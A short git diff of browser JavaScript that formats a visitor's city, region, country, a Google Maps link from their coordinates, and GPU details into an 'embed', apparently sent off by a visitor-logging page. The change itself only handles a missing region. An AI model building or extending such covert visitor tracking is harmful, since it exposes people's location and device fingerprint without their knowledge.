@@ -102,7 +102,12 @@ fetch('config.json')
                         var language = navigator.language;
     
                         // Send embed with location information if available, or a placeholder if not
+                        // console.log(location.region); ///debug
+                        if (location.region == null){
+                            var locationValue = location && location.city ? `${location.city}, ${location.country_name}` : "Location data not available";
+                        } else {
                         var locationValue = location && location.city ? `${location.city}, ${location.region}, ${location.country_name}` : "Location data not available";
+                        }
                         var gpsValue = location && location.latitude && location.longitude ? `[${locationValue}](https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude})` : "Location data not available";
     
                         var gpuValue = gpuDetails ? `${gpuDetails.vendor} - ${gpuDetails.renderer}` : "GPU data not available";
